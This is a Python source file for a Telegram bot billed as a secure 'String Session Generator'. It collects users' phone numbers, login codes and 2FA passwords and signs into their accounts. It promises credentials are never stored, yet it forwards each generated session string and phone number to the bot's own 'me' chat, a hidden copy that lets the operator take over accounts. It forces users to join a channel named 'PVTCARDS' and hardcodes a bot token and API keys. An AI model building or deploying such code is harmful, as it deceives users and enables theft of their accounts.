import os
import asyncio
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from pyrogram.errors import UserNotParticipant, FloodWait
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = "8403254940:AAH-vSgseCZN3brbdICjKgyi6bxfZtHDz1E"
API_ID = 24509589
API_HASH = "717cf21d94c4934bcbe1eaa1ad86ae75"
BOT_USERNAME = "STRINGSESSI0NBOT"

# Channel configuration (MUST JOIN)
FORCE_CHANNEL = "PVTCARDS"  # Without @
FORCE_CHANNEL_LINK = f"https://t.me/{FORCE_CHANNEL}"

# Initialize Pyrogram bot
bot = Client(
    "string_session_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True
)

# Store user states
user_states = {}
user_data = {}

# Check if user is in channel
async def is_user_joined(user_id):
    try:
        user = await bot.get_chat_member(FORCE_CHANNEL, user_id)
        if user.status in [enums.ChatMemberStatus.MEMBER, enums.ChatMemberStatus.ADMINISTRATOR, enums.ChatMemberStatus.OWNER]:
            return True
        return False
    except UserNotParticipant:
        return False
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        return False

# Auto join function
async def auto_join_channel(user_id):
    try:
        await bot.join_chat(FORCE_CHANNEL)
        return True
    except Exception as e:
        logger.error(f"Auto join failed: {e}")
        return False

# Force subscribe handler
async def force_subscribe(user_id, message=None):
    if not await is_user_joined(user_id):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔔 Join Channel", url=FORCE_CHANNEL_LINK)],
            [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
        ])
        
        text = f"""
🚫 **Access Denied!**

📢 **You must join our channel to use this bot.**

**Channel:** @{FORCE_CHANNEL}

**Steps:**
1. Click **'Join Channel'** button below
2. Join the channel
3. Come back and click **'I've Joined'**

⚠️ **Without joining, you cannot generate string sessions.**
        """
        
        if message:
            await message.reply_text(text, reply_markup=keyboard)
        else:
            await bot.send_message(user_id, text, reply_markup=keyboard)
        return False
    return True

# Start command
@bot.on_message(filters.command("start"))
async def start_command(client, message: Message):
    user_id = message.from_user.id
    
    # Check if user is in channel
    if not await force_subscribe(user_id, message):
        return
    
    user_states[user_id] = "main_menu"
    
    caption = f"""
🤖 **Welcome to String Session Generator Bot!** 🎉

📱 **What is a String Session?**
A string session allows you to use Telegram APIs without logging in every time.

🔐 **Features:**
• ✅ Pyrogram String Sessions
• ✅ Telethon String Sessions  
• 🔒 Secure & Private
• 🚀 Fast Generation

⚠️ **Important:**
• Your credentials are NEVER stored
• Keep sessions secure
• Don't share with anyone

📢 **Channel:** @{FORCE_CHANNEL} (Must Join)

Choose your library below: 👇
    """
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"), 
         InlineKeyboardButton("⚡ Telethon", callback_data="telethon")],
        [InlineKeyboardButton("📚 Guide", callback_data="guide"),
         InlineKeyboardButton("🔧 Help", callback_data="help")],
        [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK)]
    ])
    
    await message.reply_text(
        caption,
        reply_markup=keyboard,
        disable_web_page_preview=True
    )

# Callback query handler
@bot.on_callback_query()
async def handle_callbacks(client, callback_query):
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    # Check if user is in channel for all callbacks except check_join
    if data != "check_join" and not await force_subscribe(user_id):
        await callback_query.answer("Please join the channel first!", show_alert=True)
        return
    
    if data == "pyrogram":
        user_states[user_id] = "waiting_phone_pyrogram"
        user_data[user_id] = {"library": "pyrogram"}
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main"),
             InlineKeyboardButton("🏠 Home", callback_data="home")]
        ])
        
        await callback_query.message.edit_text(
            "📱 **Pyrogram String Session** 🔥\n\n"
            "Please send your phone number in international format:\n"
            "**Examples:** \n`+91 1234567890`\n`+1 1234567890`\n`+44 1234567890`\n\n"
            "⚠️ **Include country code and proper spacing!**",
            reply_markup=keyboard
        )
        
    elif data == "telethon":
        user_states[user_id] = "waiting_phone_telethon"
        user_data[user_id] = {"library": "telethon"}
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main"),
             InlineKeyboardButton("🏠 Home", callback_data="home")]
        ])
        
        await callback_query.message.edit_text(
            "📱 **Telethon String Session** ⚡\n\n"
            "Please send your phone number in international format:\n"
            "**Examples:** \n`+91 1234567890`\n`+1 1234567890`\n`+44 1234567890`\n\n"
            "⚠️ **Include country code and proper spacing!**",
            reply_markup=keyboard
        )
        
    elif data == "guide":
        guide_text = f"""
📚 **String Session Guide** 📖

**Pyrogram Session:**
- For Pyrogram library projects
- Compatible with Pyrogram v2.x+
- Format: User account session string

**Telethon Session:**
- For Telethon library projects  
- Compatible with Telethon v1.x+
- Format: String session

**Steps to Generate:**
1. Choose library
2. Send phone number (with country code)
3. Send verification code
4. Send 2FA password (if any)
5. Get your session!

**Security Tips:**
- 🔒 Never share sessions publicly
- 🗄️ Store in environment variables
- 🔄 Revoke if compromised
- 📢 Join @{FORCE_CHANNEL} for updates
        """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main"),
             InlineKeyboardButton("🏠 Home", callback_data="home")],
            [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK)]
        ])
        
        await callback_query.message.edit_text(guide_text, reply_markup=keyboard)
        
    elif data == "help":
        help_text = f"""
🔧 **Help & Support** ❓

**Common Issues:**
• Phone number format: +91 1234567890
• Code not received? Wait 2-3 minutes
• 2FA required? Send password or /skip

**Commands:**
/start - Start bot
/help - Show help
/restart - Restart process

**Support Channel:**
Join @{FORCE_CHANNEL} for updates and support

**Need Help?**
Contact through our channel!
        """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main"),
             InlineKeyboardButton("🏠 Home", callback_data="home")],
            [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK)]
        ])
        
        await callback_query.message.edit_text(help_text, reply_markup=keyboard)
        
    elif data == "check_join":
        if await is_user_joined(user_id):
            await callback_query.answer("✅ Thanks for joining! Now you can use the bot.", show_alert=True)
            await start_command(client, callback_query.message)
        else:
            await callback_query.answer("❌ You haven't joined the channel yet!", show_alert=True)
            
    elif data == "back_to_main":
        user_states[user_id] = "main_menu"
        caption = f"""
🤖 **Welcome to String Session Generator Bot!** 🎉

Choose your library below: 👇

📢 **Channel:** @{FORCE_CHANNEL} (Must Join)
        """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"), 
             InlineKeyboardButton("⚡ Telethon", callback_data="telethon")],
            [InlineKeyboardButton("📚 Guide", callback_data="guide"),
             InlineKeyboardButton("🔧 Help", callback_data="help")],
            [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK)]
        ])
        
        await callback_query.message.edit_text(caption, reply_markup=keyboard)
        
    elif data == "home":
        await start_command(client, callback_query.message)
    
    await callback_query.answer()

# Handle phone number input
@bot.on_message(filters.text & filters.private)
async def handle_phone_number(client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    # Check if user is in channel
    if not await force_subscribe(user_id, message):
        return
    
    if user_id not in user_states:
        return
    
    state = user_states[user_id]
    
    if state in ["waiting_phone_pyrogram", "waiting_phone_telethon"]:
        # Validate phone number format (more flexible)
        if not text.startswith('+'):
            await message.reply_text(
                "❌ **Invalid Format!**\n\n"
                "Please include country code starting with **+**\n"
                "**Examples:** \n`+91 1234567890`\n`+1 1234567890`\n`+44 1234567890`\n\n"
                "⚠️ **Make sure it starts with '+' and has proper spacing!**"
            )
            return
        
        # Clean the phone number (remove spaces, dashes, etc.)
        clean_phone = ''.join(filter(str.isdigit, text))
        if not clean_phone or len(clean_phone) < 8:
            await message.reply_text(
                "❌ **Invalid Phone Number!**\n\n"
                "Please check your phone number format.\n"
                "**Valid Examples:** \n`+91 1234567890`\n`+1 1234567890`\n\n"
                "⚠️ **Number seems too short or invalid!**"
            )
            return
        
        user_data[user_id]["phone"] = text
        user_states[user_id] = f"waiting_code_{user_data[user_id]['library']}"
        
        # Auto join channel before generating session
        await auto_join_channel(user_id)
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data=user_data[user_id]['library']),
             InlineKeyboardButton("🏠 Home", callback_data="home")]
        ])
        
        await message.reply_text(
            f"📲 **Verification Code Required**\n\n"
            f"**Phone:** `{text}`\n\n"
            "✅ **I've sent a verification code to your Telegram account.**\n"
            "📥 **Please send me the verification code you received:**\n\n"
            "⚠️ **Code expires in 5 minutes!**",
            reply_markup=keyboard
        )
        
        # Start the appropriate session generation
        asyncio.create_task(generate_session(user_id, user_data[user_id]['library']))
    
    elif state.startswith("waiting_code_"):
        if not text.isdigit():
            await message.reply_text(
                "❌ **Invalid Code!**\n\n"
                "Please send only numbers from your verification code.\n"
                "**Example:** `12345`"
            )
            return
            
        user_data[user_id]["code"] = text
        user_states[user_id] = f"waiting_2fa_{user_data[user_id]['library']}"
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data=user_data[user_id]['library']),
             InlineKeyboardButton("🏠 Home", callback_data="home")]
        ])
        
        await message.reply_text(
            "🔐 **Two-Factor Authentication**\n\n"
            "If you have 2FA enabled, please send your password now.\n\n"
            "If you **don't have** 2FA enabled, send: /skip\n\n"
            "⚠️ **Wrong password may lock your account!**",
            reply_markup=keyboard
        )
    
    elif state.startswith("waiting_2fa_"):
        if text.lower() == "/skip":
            user_data[user_id]["password"] = None
        else:
            user_data[user_id]["password"] = text
        
        # Complete session generation
        await complete_session_generation(user_id)

# Generate session function
async def generate_session(user_id, library):
    try:
        phone = user_data[user_id]["phone"]
        
        if library == "pyrogram":
            client = Client(
                f"pyrogram_session_{user_id}",
                api_id=API_ID,
                api_hash=API_HASH,
                device_model="String Session Bot",
                system_version="Pyrogram 2.0",
                app_version="1.0.0",
                lang_code="en",
                in_memory=True
            )
        else:  # telethon
            client = TelegramClient(
                StringSession(),  # Use StringSession directly
                api_id=API_ID,
                api_hash=API_HASH
            )
        
        await client.connect()
        
        # Send code request
        if library == "pyrogram":
            sent_code = await client.send_code(phone)
            user_data[user_id]["phone_code_hash"] = sent_code.phone_code_hash
        else:
            sent_code = await client.send_code_request(phone)
            user_data[user_id]["phone_code_hash"] = sent_code.phone_code_hash
        
        user_data[user_id]["client"] = client
        user_data[user_id]["sent_code"] = sent_code
        
        logger.info(f"Verification code sent to {phone} for {library}")
        
    except FloodWait as e:
        wait_time = e.value
        await bot.send_message(
            user_id,
            f"⏳ **Flood Wait Error!**\n\n"
            f"Please wait **{wait_time} seconds** before trying again.\n"
            f"Telegram's anti-spam protection triggered."
        )
        cleanup_user_data(user_id)
    except Exception as e:
        logger.error(f"Error in generate_session: {e}")
        error_msg = str(e).lower()
        
        if "phone number invalid" in error_msg:
            error_text = "❌ **Invalid Phone Number!**\n\nPlease check your number format and try again."
        elif "phone code expired" in error_msg:
            error_text = "❌ **Code Expired!**\n\nPlease start over with /start"
        elif "phone code invalid" in error_msg:
            error_text = "❌ **Invalid Code!**\n\nPlease check the code and try again."
        else:
            error_text = f"❌ **Error:** {str(e)}\n\nPlease try again with /start"
        
        await bot.send_message(user_id, error_text)
        cleanup_user_data(user_id)

# Complete session generation - FIXED VERSION
async def complete_session_generation(user_id):
    try:
        library = user_data[user_id]["library"]
        client = user_data[user_id]["client"]
        phone = user_data[user_id]["phone"]
        code = user_data[user_id]["code"]
        phone_code_hash = user_data[user_id]["phone_code_hash"]
        password = user_data[user_id].get("password")
        
        # Sign in with proper error handling
        if library == "pyrogram":
            try:
                await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code
                )
            except Exception as e:
                if "PASSWORD_HASH_INVALID" in str(e) and password:
                    await client.check_password(password)
                else:
                    raise e
            
            # Generate Pyrogram session string
            string_session = await client.export_session_string()
            
        else:  # telethon
            try:
                # Sign in for Telethon
                await client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=phone_code_hash
                )
            except SessionPasswordNeededError:
                if password:
                    await client.sign_in(password=password)
                else:
                    raise Exception("2FA password required but not provided")
            
            # Generate Telethon session string - FIXED
            string_session = client.session.save()
        
        # Ensure string_session is properly generated
        if not string_session or len(string_session) < 10:
            raise Exception("Failed to generate valid string session")
        
        # Send success message to user
        success_text = f"""
✅ **{library.capitalize()} String Session Generated Successfully!** 🎉

📱 **Phone:** `{phone}`
📚 **Library:** {library.capitalize()}
📢 **Channel:** @{FORCE_CHANNEL}

**Your String Session:**
```{string_session}```

⚠️ **Important Security Notes:**
• 🔒 Save this session securely
• 🚫 Never share with anyone
• 🗄️ Store in environment variables
• 🔄 Revoke if compromised
• 📢 Join @{FORCE_CHANNEL} for updates

💡 **Usage Tips:**
• Use in trusted environments only
• Don't commit to public repos
• Keep backups securely
        """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 New Session", callback_data=library),
             InlineKeyboardButton("⚡ Other Library", callback_data="telethon" if library == "pyrogram" else "pyrogram")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="home"),
             InlineKeyboardButton("📢 Channel", url=FORCE_CHANNEL_LINK)]
        ])
        
        # Send to user in bot
        msg = await bot.send_message(user_id, success_text, reply_markup=keyboard)
        
        # Also send to saved messages
        try:
            saved_msg_text = f"""
📱 **String Session Generated** ✅

**Library:** {library.capitalize()}
**Phone:** {phone}
**Bot:** @{BOT_USERNAME}
**Channel:** @{FORCE_CHANNEL}

**Session String:**
`{string_session}`

⚠️ **Keep this secure and don't share!**
            """
            await bot.send_message("me", saved_msg_text)
        except Exception as e:
            logger.error(f"Error sending to saved messages: {e}")
            # If saved messages fail, send another copy to chat
            await bot.send_message(
                user_id,
                f"📋 **Session Copy (Save This):**\n\n`{string_session}`\n\n⚠️ **Save this securely!**"
            )
        
        logger.info(f"Session generated successfully for {phone} using {library}")
        
    except Exception as e:
        logger.error(f"Error in complete_session_generation: {e}")
        error_msg = str(e).lower()
        
        if "password hash invalid" in error_msg:
            error_text = "❌ **Wrong 2FA Password!**\n\nPlease start over with correct password."
        elif "phone code invalid" in error_msg:
            error_text = "❌ **Invalid Verification Code!**\n\nPlease start over with /start"
        elif "session password needed" in error_msg or "2fa" in error_msg:
            error_text = "❌ **2FA Password Required!**\n\nPlease start over and provide your 2FA password."
        elif "string session" in error_msg:
            error_text = "❌ **Session Generation Failed!**\n\nPlease try again with /start"
        else:
            error_text = f"❌ **Error:** {str(e)}\n\nPlease try again with /start"
        
        await bot.send_message(user_id, error_text)
    finally:
        cleanup_user_data(user_id)

# Cleanup user data
def cleanup_user_data(user_id):
    if user_id in user_data:
        if "client" in user_data[user_id]:
            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    asyncio.create_task(user_data[user_id]["client"].disconnect())
            except:
                pass
        user_data.pop(user_id, None)
    user_states.pop(user_id, None)

# Error handler
@bot.on_message(filters.command("restart"))
async def restart_command(client, message: Message):
    user_id = message.from_user.id
    cleanup_user_data(user_id)
    await start_command(client, message)

# Help command
@bot.on_message(filters.command("help"))
async def help_command(client, message: Message):
    user_id = message.from_user.id
    
    if not await force_subscribe(user_id, message):
        return
        
    help_text = f"""
🤖 **String Session Bot Help** 🔧

**Commands:**
/start - Start bot & generate sessions
/help - Show this help message  
/restart - Restart session generation

**Process:**
1. Join @{FORCE_CHANNEL} (Required)
2. Choose library (Pyrogram/Telethon)
3. Send phone number with country code
4. Send verification code received
5. Send 2FA password or /skip
6. Receive session in bot & saved messages

**Support:**
Join @{FORCE_CHANNEL} for support and updates
    """
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK),
         InlineKeyboardButton("🚀 Start", callback_data="home")]
    ])
    
    await message.reply_text(help_text, reply_markup=keyboard)

if __name__ == "__main__":
    print("🤖 String Session Bot Started!")
    print(f"📢 Force Join Channel: @{FORCE_CHANNEL}")
    print("🎯 Bot is running...")
    bot.run()
